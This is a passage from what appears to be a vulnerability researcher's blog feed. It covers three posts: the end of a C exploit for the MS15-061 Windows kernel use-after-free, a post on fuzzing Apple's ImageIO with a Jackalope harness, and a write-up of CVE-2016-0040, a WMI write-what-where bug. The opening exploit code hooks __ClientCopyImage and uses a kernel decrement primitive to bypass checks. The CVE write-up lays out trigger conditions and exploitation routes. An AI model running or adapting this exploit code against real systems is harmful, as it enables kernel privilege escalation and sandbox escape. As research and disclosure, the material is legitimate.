    <span class="n">kernelHandle</span> <span class="o">=</span> <span class="n">GetKernelHandle</span><span class="p">(</span><span class="n">Secondhwnd</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
    <span class="n">ArbDecByOne</span><span class="p">((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">kernelHandle</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">);</span> <span class="c1">//</span>

    <span class="n">__ClientCopyImageAddress</span> <span class="o">=</span> <span class="n">Get__ClientCopyImageAddressInPEB</span><span class="p">();</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"address of __ClientCopyImage is %x </span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">__ClientCopyImageAddress</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">__ClientCopyImageAddress</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prot</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">g_originalCCI</span> <span class="o">=</span> <span class="p">(</span><span class="n">pUser32_ClientCopyImage</span><span class="p">)</span><span class="n">InterlockedExchangePointer</span><span class="p">(</span><span class="n">__ClientCopyImageAddress</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hookCCI</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">WNDCLASSEX</span> <span class="n">wc</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
    <span class="n">MSG</span> <span class="n">Msg</span><span class="p">;</span>

    <span class="c1">// Step 1: Registering the Window Class</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">cbSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WNDCLASSEX</span><span class="p">);</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">style</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">lpfnWndProc</span> <span class="o">=</span> <span class="n">WndProc</span><span class="p">;</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">cbClsExtra</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">cbWndExtra</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">hInstance</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">hIcon</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>   <span class="c1">// bypass  check  inside xxxSetClassIcon to lead  execution path to callback</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">hCursor</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="c1">// bypass  check  inside xxxSetClassIcon to lead  execution path to callback</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">hbrBackground</span> <span class="o">=</span> <span class="p">(</span><span class="n">HBRUSH</span><span class="p">)(</span><span class="n">COLOR_WINDOW</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">lpszMenuName</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">lpszClassName</span> <span class="o">=</span> <span class="n">g_szClassName</span><span class="p">;</span>
    <span class="n">wc</span><span class="p">.</span><span class="n">hIconSm</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="c1">// bypass  "if" inside xxxSetClassIcon to lead  execution  path to callback</span>

    <span class="n">init</span><span class="p">();</span>

    <span class="cm">/*


        .text:BF91B33C                 mov     edi, [ebp+pclsBase]
        ..............
        ..............
        .text:BF91B346                 mov     eax, [edi+58h]
        .text:BF91B349                 cmp     eax, [ebp+arg_8] ; new and  old  icon must be  diffrent
        .text:BF91B34C                 jz      loc_BF91B42C     -----------&gt;&gt;&gt; we  need bypass this
        ..............
        ..............
        .text:BF91B396 loc_BF91B396:                           ; CODE XREF: xxxSetClassIcon(x,x,x,x)+68j
        .text:BF91B396                 lea     esi, [edi+58h]  ;  EDI
        .text:BF91B399                 mov     ecx, esi
        .text:BF91B39B                 mov     edx, [ebp+arg_8]
        .text:BF91B39E                 call    @HMAssignmentLock@8 ; HMAssignmentLock(x,x)
        .text:BF91B3A3                 cmp     dword ptr [edi+44h], 0
        .text:BF91B3A7                 jz      short loc_BF91B3B4  ----------&gt;&gt;&gt; we  need  bypass this
        .text:BF91B3A9                 cmp     dword ptr [esi], 0
        .text:BF91B3AC                 jnz     short loc_BF91B3B4  ----------&gt;&gt;&gt; we  need  bypass this
        .text:BF91B3AE                 push    edi
        .text:BF91B3AF                 call    _xxxCreateClassSmIcon@4 ; xxxCreateClassSmIcon(x)

    */</span>

    <span class="k">do</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">RegisterClassExW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">wc</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">// Step 2: Creating the Window</span>
        <span class="n">hwnd</span> <span class="o">=</span> <span class="n">CreateWindowEx</span><span class="p">(</span>
            <span class="n">WS_EX_CLIENTEDGE</span><span class="p">,</span>
            <span class="n">g_szClassName</span><span class="p">,</span>
            <span class="s">L"The title of my window"</span><span class="p">,</span>
            <span class="n">WS_OVERLAPPEDWINDOW</span><span class="p">,</span>
            <span class="n">CW_USEDEFAULT</span><span class="p">,</span> <span class="n">CW_USEDEFAULT</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span>
            <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">hwnd</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">ShowWindow</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
        <span class="n">UpdateWindow</span><span class="p">(</span><span class="n">hwnd</span><span class="p">);</span>
        <span class="c1">// Triger UserMode CallBack</span>
        <span class="n">SetClassLongPtr</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span> <span class="n">GCLP_HICON</span><span class="p">,</span> <span class="p">(</span><span class="n">LONG_PTR</span><span class="p">)</span><span class="n">LoadIcon</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">IDI_QUESTION</span><span class="p">));</span>

        <span class="n">SendMessageW</span><span class="p">(</span><span class="n">Secondhwnd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">WM_NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">success</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>]]></content><author><name></name></author><category term="fuzzing" /><summary type="html"><![CDATA[MS15-061 is a Use After Free vulnerability in Windows Kernel. A malicious application can exploit it be able to execute arbitrary code with kernel privileges.]]></summary></entry><entry><title type="html">ImageIO, the infamous iOS Zero Click Attack Vector.</title><link href="http://0.0.0.0:4000/fuzzing/2024/03/29/iOSImageIO.html" rel="alternate" type="text/html" title="ImageIO, the infamous iOS Zero Click Attack Vector." /><published>2024-03-29T18:27:59+09:00</published><updated>2024-03-29T18:27:59+09:00</updated><id>http://0.0.0.0:4000/fuzzing/2024/03/29/iOSImageIO</id><content type="html" xml:base="http://0.0.0.0:4000/fuzzing/2024/03/29/iOSImageIO.html"><![CDATA[<p>ImageIO is Apple’s Framework that handles image parsing, which exposes 0click attack surface</p>

<p>Months after reading <a href="https://googleprojectzero.blogspot.com/2020/04/fuzzing-imageio.html">this blog post from Google Project Zero</a> about fuzzing ImageIO, I used LLDB to examine the testHeader functions, it turned out there are three new <code class="language-plaintext highlighter-rouge">testHeader</code> functions for different file formats.</p>

<p>such as <code class="language-plaintext highlighter-rouge">KTX2</code> and <code class="language-plaintext highlighter-rouge">WebP</code> and <code class="language-plaintext highlighter-rouge">ETC</code>, so because they were fairly new I thought maybe they have not been fuzzed by Project Zero.</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">1.30: where <span class="o">=</span> ImageIO<span class="sb">`</span>IIO_Reader_KTX2::testHeader<span class="o">(</span>unsigned char const<span class="k">*</span>, unsigned long, __CFString const<span class="k">*</span><span class="o">)</span>, address <span class="o">=</span> 0x00007ff8134cecc2, resolved, hit count <span class="o">=</span> 5 
1.26: where <span class="o">=</span> ImageIO<span class="sb">`</span>IIO_Reader_WebP::testHeader<span class="o">(</span>unsigned char const<span class="k">*</span>, unsigned long, __CFString const<span class="k">*</span><span class="o">)</span>, address <span class="o">=</span> 0x00007ff81341f368, resolved, hit count <span class="o">=</span> 0 
1.31: where <span class="o">=</span> ImageIO<span class="sb">`</span>IIO_Reader_ETC::testHeader<span class="o">(</span>unsigned char const<span class="k">*</span>, unsigned long, __CFString const<span class="k">*</span><span class="o">)</span>, address <span class="o">=</span> 0x00007ff8134dd1c6, resolved, hit count <span class="o">=</span> 2</code></pre></figure>

<p>KTX2 is a relatively new specification introduced after the Project Zero fuzzing efforts. Arguably, its source code is also new. Further information about KTX2 can be found in its specification document here: <a href="https://registry.khronos.org/KTX/specs/2.0/ktxspec_v2.html">khronos.org</a>.</p>

<p>Although WebP has not been fuzzed by Project Zero, it is fuzzed with Google OSS-Fuzz. So I decided not to compete with Google’s fuzzer in this regard.</p>

<p>Another important issue I noticed was that in the Project Zero’s blog, ImageIO was using <code class="language-plaintext highlighter-rouge">OpenEXR</code>, but in my test, ImageIO was using Apple’s closed-source new implementation of EXR in <code class="language-plaintext highlighter-rouge">libAppleEXR.dylib</code>. Therefore, I decided to fuzz these two file formats, EXR and KTX2.</p>

<p>the Samuel Groß has modifed Honggfuzz to have a binary Coverage-guided fuzzing. but I ported Project Zero’s harness to <a href="https://github.com/googleprojectzero/Jackalope">Jackalope fuzzer</a> (awesome project thanks to Ivan Fratric), also I used  <code class="language-plaintext highlighter-rouge">initWithData</code> method of NSImage and in-memory fuzzing option of Jackalope to make the fuzzing faster.</p>

<p>I managed to find lots of KTX2 sample files in the following pages:</p>
<ul>
  <li><a href="https://github.com/donmccurdy/KTX-Parse/tree/main/test/data/reference">https://github.com/donmccurdy/KTX-Parse/tree/main/test/data/reference</a></li>
  <li><a href="https://github.com/KhronosGroup/KTX-Software">https://github.com/KhronosGroup/KTX-Software</a></li>
</ul>

<p>you can also use <code class="language-plaintext highlighter-rouge">DYLD_INSERT_LIBRARIES=/usr/lib/libgmalloc.dylib</code> to increase the change of finding more bugs.</p>

<p>My fuzzing effort found several vulnerabilities, you can see them in my <a href="https://r00tkitsmm.github.io/fuzzing/2024/03/27/CVEs.html">CVEs page</a></p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;Foundation/Foundation.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;Foundation/NSURL.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;dlfcn.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/shm.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;dirent.h&gt;</span><span class="cp">
</span>
<span class="cp">#import &lt;ImageIO/ImageIO.h&gt;
#import &lt;AppKit/AppKit.h&gt;
#import &lt;CoreGraphics/CoreGraphics.h&gt;
</span>

<span class="cp">#define MAX_SAMPLE_SIZE 1000000
#define SHM_SIZE (4 + MAX_SAMPLE_SIZE)
</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">shm_data</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">setup_shmem</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

  <span class="c1">// get shared memory file descriptor (NOT a file)</span>
  <span class="n">fd</span> <span class="o">=</span> <span class="n">shm_open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">,</span> <span class="n">S_IRUSR</span> <span class="o">|</span> <span class="n">S_IWUSR</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Error in shm_open</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="c1">// map shared memory to process address space</span>
  <span class="n">shm_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">SHM_SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">shm_data</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Error in mmap</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>


<span class="k">extern</span> <span class="kt">bool</span> <span class="n">CGRenderingStateGetAllowsAcceleration</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">);</span>
<span class="k">extern</span> <span class="kt">bool</span> <span class="n">CGRenderingStateSetAllowsAcceleration</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">,</span> <span class="kt">bool</span><span class="p">);</span>
<span class="k">extern</span> <span class="kt">void</span><span class="o">*</span> <span class="n">CGContextGetRenderingState</span><span class="p">(</span><span class="n">CGContextRef</span><span class="p">);</span>

<span class="kt">void</span> <span class="n">dummyLogProc</span><span class="p">()</span> <span class="p">{</span> <span class="p">}</span>

<span class="k">extern</span> <span class="kt">void</span> <span class="n">HF_ITER</span><span class="p">(</span><span class="kt">uint8_t</span><span class="o">**</span> <span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span><span class="o">*</span> <span class="n">len</span><span class="p">);</span>
<span class="k">extern</span> <span class="kt">void</span> <span class="n">ImageIOSetLoggingProc</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">);</span>


<span class="kt">void</span> <span class="n">__attribute__</span> <span class="p">((</span><span class="n">noinline</span><span class="p">))</span> <span class="n">fuzz_image</span><span class="p">()</span> <span class="p">{</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">sample_bytes</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">sample_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  
  <span class="c1">// read the sample either from file or</span>
  <span class="c1">// shared memory</span>
    <span class="n">sample_size</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">shm_data</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">sample_size</span> <span class="o">&gt;</span> <span class="n">MAX_SAMPLE_SIZE</span><span class="p">)</span> <span class="n">sample_size</span> <span class="o">=</span> <span class="n">MAX_SAMPLE_SIZE</span><span class="p">;</span>
    <span class="n">sample_bytes</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">sample_size</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">sample_bytes</span><span class="p">,</span> <span class="n">shm_data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">),</span> <span class="n">sample_size</span><span class="p">);</span>
    <span class="n">NSData</span><span class="o">*</span> <span class="n">content</span> <span class="o">=</span> <span class="p">[</span><span class="n">NSData</span> <span class="n">dataWithBytes</span><span class="o">:</span><span class="n">sample_bytes</span> <span class="n">length</span><span class="o">:</span><span class="n">sample_size</span><span class="p">];</span>
    <span class="n">free</span><span class="p">(</span><span class="n">sample_bytes</span><span class="p">)</span>
    
    <span class="n">NSImage</span><span class="o">*</span> <span class="n">img</span> <span class="o">=</span> <span class="p">[[</span><span class="n">NSImage</span> <span class="n">alloc</span><span class="p">]</span> <span class="n">initWithData</span><span class="o">:</span><span class="n">content</span><span class="p">];</span>
    
   <span class="c1">// NSImage *img = [[NSImage alloc]initWithContentsOfFile:objcstring];</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">img</span> <span class="o">==</span> <span class="n">nil</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">NSLog</span><span class="p">(</span><span class="err">@</span><span class="s">"image nil"</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="n">CGImageRef</span> <span class="n">cgImg</span> <span class="o">=</span> <span class="p">[</span><span class="n">img</span> <span class="n">CGImageForProposedRect</span><span class="o">:</span><span class="n">nil</span> <span class="n">context</span><span class="o">:</span><span class="n">nil</span> <span class="n">hints</span><span class="o">:</span><span class="n">nil</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">cgImg</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">size_t</span> <span class="n">width</span> <span class="o">=</span> <span class="n">CGImageGetWidth</span><span class="p">(</span><span class="n">cgImg</span><span class="p">);</span>
        <span class="kt">size_t</span> <span class="n">height</span> <span class="o">=</span> <span class="n">CGImageGetHeight</span><span class="p">(</span><span class="n">cgImg</span><span class="p">);</span>
        <span class="n">CGColorSpaceRef</span> <span class="n">colorspace</span> <span class="o">=</span> <span class="n">CGColorSpaceCreateDeviceRGB</span><span class="p">();</span>
        <span class="n">CGContextRef</span> <span class="n">ctx</span> <span class="o">=</span> <span class="n">CGBitmapContextCreate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">width</span><span class="p">,</span> <span class="n">height</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">colorspace</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
        <span class="kt">void</span><span class="o">*</span> <span class="n">renderingState</span> <span class="o">=</span> <span class="n">CGContextGetRenderingState</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
        <span class="n">CGRenderingStateSetAllowsAcceleration</span><span class="p">(</span><span class="n">renderingState</span><span class="p">,</span> <span class="nb">false</span><span class="p">);</span>
        <span class="n">CGRect</span> <span class="n">rect</span> <span class="o">=</span> <span class="n">CGRectMake</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">width</span><span class="p">,</span> <span class="n">height</span><span class="p">);</span>
        <span class="n">CGContextDrawImage</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="n">rect</span><span class="p">,</span> <span class="n">cgImg</span><span class="p">);</span>
        <span class="n">CGColorSpaceRelease</span><span class="p">(</span><span class="n">colorspace</span><span class="p">);</span>
        <span class="n">CGContextRelease</span><span class="p">(</span><span class="n">ctx</span><span class="p">);</span>
        <span class="n">CGImageRelease</span><span class="p">(</span><span class="n">cgImg</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="p">[</span><span class="n">img</span> <span class="n">release</span><span class="p">];</span>
<span class="p">}</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="n">NSError</span><span class="o">*</span> <span class="n">err</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">NSLog</span><span class="p">(</span><span class="err">@</span><span class="s">"need an image file"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">setup_shmem</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Error mapping shared memory</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">ImageIOSetLoggingProc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dummyLogProc</span><span class="p">);</span>
    <span class="n">fuzz_image</span><span class="p">();</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>]]></content><author><name></name></author><category term="fuzzing" /><summary type="html"><![CDATA[ImageIO is Apple’s Framework that handles image parsing, which exposes 0click attack surface]]></summary></entry><entry><title type="html">CVE-2016-0040 Story of Uninitialized Pointer in Windows Kernel</title><link href="http://0.0.0.0:4000/fuzzing/2024/03/29/wmicuninitializedpointer.html" rel="alternate" type="text/html" title="CVE-2016-0040 Story of Uninitialized Pointer in Windows Kernel" /><published>2024-03-29T09:01:59+09:00</published><updated>2024-03-29T09:01:59+09:00</updated><id>http://0.0.0.0:4000/fuzzing/2024/03/29/wmicuninitializedpointer</id><content type="html" xml:base="http://0.0.0.0:4000/fuzzing/2024/03/29/wmicuninitializedpointer.html"><![CDATA[<p>Update:</p>

<p>This post is a resharing of a blog I wrote about a vulnerability I discovered in Windows kernel almost a decade ago.</p>

<p>this vulnerablity is interesting for three reseaons</p>
<ul>
  <li>it’s a tweetable vulnerablity :)</li>
  <li>it gave Write arbitrary data to arbitrary address primitive.</li>
  <li>it has an amusing story associated with it. after my discovery of this vulnerability, I <a href="https://web.archive.org/web/20190420082929/https://twitter.com/R00tkitSMM/status/656214430464786432">shared a tweet</a> about it, which caught the attention of researchers from Microsoft. Remarkably, they were able to discern the root cause of the vulnerability simply by examining my tweet.
you can read their story in <a href="https://msrc.microsoft.com/blog/2017/06/tales-from-the-msrc-from-pixels-to-poc/">MSRC blog</a></li>
</ul>

<p><img src="/assets/tweet.png" alt="My image Name" /></p>
<ul>
  <li>there was another vulnerablity( CVE-2016-0087) in this function I had found and I was expecting MSRC to spot it when then are auditing wmi, but they didn’t.</li>
</ul>

<p>Original post:</p>

<p>A few months ago, I discovered some vulnerabilities in the Windows kernel, mostly related to local privilege escalation.</p>

<p>Microsoft patched one of the reported vulnerabilities in MS16-014. The vulnerability type is an uninitialized pointer dereference. This vulnerability can be triggered even by a process with “low integrity level”, meaning that successfully exploiting this vulnerability can lead to bypassing the sandbox (for example, the IE sandbox) or generic local privilege escalation for any process.</p>

<p>Here’s a description of the bug:</p>

<p>For handling some WMI functions, Windows NT creates a named device called <code class="language-plaintext highlighter-rouge">WMIDataDevice</code>.</p>

<p>This device is accessible from user mode with any permission (you can check it with WinObj). WMIDataDevice handles some IOCTLs, with the <code class="language-plaintext highlighter-rouge">WmipReceiveNotifications</code> function responsible for the <code class="language-plaintext highlighter-rouge">IOCTL_WMI_ENUMERATE_GUIDS IOCTL</code>. Based on the first DWORD of <code class="language-plaintext highlighter-rouge">Irp-&gt;AssociatedIrp.SystemBuffer</code>, WmipReceiveNotifications decides whether to use the <code class="language-plaintext highlighter-rouge">stack</code> or <code class="language-plaintext highlighter-rouge">kernel pool</code> as a buffer for storing data/pointers. If the first DWORD is less than or equal to 0x10, the stack is selected as the buffer.</p>

<p>There’s another important usage of the mentioned DWORD. WmipReceiveNotifications uses this DWORD as a counter for looping and initializing the local buffer. So, if we put 0 in the first DWORD of Irp-&gt;AssociatedIrp.SystemBuffer from user mode, the function selects the stack as the buffer. As mentioned earlier, this buffer is initiated in a loop. In this case, since we passed 0, the function skips loop execution, leaving the stack buffer uninitialized.</p>

<p>To reach the vulnerability, we need to bypass some other condition inside WmipReceiveNotifications.</p>

<p>v16 comes from user mode and its value needs to be 2.</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="n">v16</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">SystemBuffer</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span></code></pre></figure>

<p>Insert a valid handle for ObReferenceObjectByHandle in SystemBuffer.</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="n">v39</span> <span class="o">=</span> <span class="n">ObReferenceObjectByHandle</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">HANDLE</span> <span class="o">*</span><span class="p">)(</span><span class="n">SystemBuffer</span> <span class="o">+</span> <span class="mi">16</span><span class="p">),</span> <span class="mh">0x43Au</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">PIRP</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span></code></pre></figure>

<p>finally uninitialized local variable used as target pointer and function write a DWORD from SystemBuffer + 8 to it</p>

<p>we can control what is written but for manipulating uninitialized stack we need a good stack spray inside kernel</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="n">v23</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">LocalBuffer</span><span class="p">;</span>

<span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v23</span> <span class="o">+</span> <span class="mi">60</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">SystemBuffer</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span> <span class="c1">// Write arbitrary data to uninitialized local variable or Write-what-where condition</span></code></pre></figure>

<p>Utilizing an uninitialized local variable as a pointer to write arbitrary data to its referenced location requires the attacker to employ a stack spraying technique for successful exploitation. This vulnerability presents a “write-what-where” condition, offering multiple ways for exploitation, such as zero ACL or SET token permission.</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="kt">int</span> <span class="n">__userpurge</span> <span class="nf">WmipReceiveNotifications</span><span class="p">(</span><span class="kt">int</span> <span class="n">SystemBuffer</span> <span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span> <span class="n">OutputBufferSize</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">PIRP</span><span class="p">)</span> <span class="p">{</span>
     <span class="p">...</span>
     <span class="p">...</span>
 
     <span class="n">v4</span> <span class="o">=</span> <span class="n">SystemBuffer</span><span class="p">;</span>
     <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span> <span class="n">OutputBufferSize</span><span class="p">;</span>
     <span class="n">v6</span> <span class="o">=</span> <span class="o">*</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span> <span class="p">)</span> <span class="n">v4</span><span class="p">;</span>
     <span class="n">v39</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1073741811</span><span class="p">;</span>
     <span class="n">v37</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
     <span class="n">v36</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">(</span><span class="n">v6</span> <span class="o">&lt;=</span> <span class="mh">0x10</span><span class="p">)</span> <span class="c1">// if first value inside buffer from user mode is less than or equal to 0x10 then use local stack so we pass 0 to force use local stack</span>
     <span class="p">{</span>
         <span class="n">LocalBuffer</span> <span class="o">=&amp;</span> <span class="n">v32</span><span class="p">;;</span>
         
     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
         <span class="n">LocalBuffer</span> <span class="o">=</span> <span class="n">ExAllocatePoolWithTag</span><span class="p">(</span><span class="n">PagedPool</span><span class="p">,</span> <span class="mi">8</span> <span class="o">*</span> <span class="n">v6</span><span class="p">,</span> <span class="mh">0x70696D57</span> <span class="n">u</span><span class="p">);</span>
         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">LocalBuffer</span><span class="p">)</span>
             <span class="k">return</span> <span class="o">-</span><span class="mi">1073741670</span><span class="p">;</span>
     <span class="p">}</span>
 
     <span class="n">we</span> <span class="n">don</span> <span class="err">'</span><span class="n">t</span> <span class="n">go</span> <span class="n">inside</span> <span class="k">this</span> <span class="k">if</span> <span class="n">because</span> <span class="n">we</span> <span class="n">use</span> <span class="n">passed</span> <span class="n">zero</span>
 
     <span class="n">v42</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
